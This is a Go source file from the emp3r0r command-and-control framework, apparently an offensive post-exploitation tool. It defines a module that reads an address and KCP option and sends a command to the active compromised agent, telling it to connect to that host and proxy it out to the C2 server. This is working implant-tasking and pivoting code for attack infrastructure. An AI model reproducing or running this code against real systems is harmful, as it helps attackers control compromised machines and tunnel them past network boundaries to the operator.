package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleBring2CC() {
	addrOpt, ok := live.AvailableModuleOptions["addr"]
	if !ok {
		logging.Errorf("Option 'addr' not found")
		return
	}
	addr := addrOpt.Val

	kcpOpt, ok := live.AvailableModuleOptions["kcp"]
	if !ok {
		logging.Errorf("Option 'kcp' not found")
		return
	}
	use_kcp := kcpOpt.Val

	cmd := fmt.Sprintf("%s --addr %s --kcp %s", def.C2CmdBring2CC, addr, use_kcp)
	err := agents.SendCmd(cmd, "", live.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("agent %s is connecting to %s to proxy it out to C2", live.ActiveAgent.Tag, addr)
}
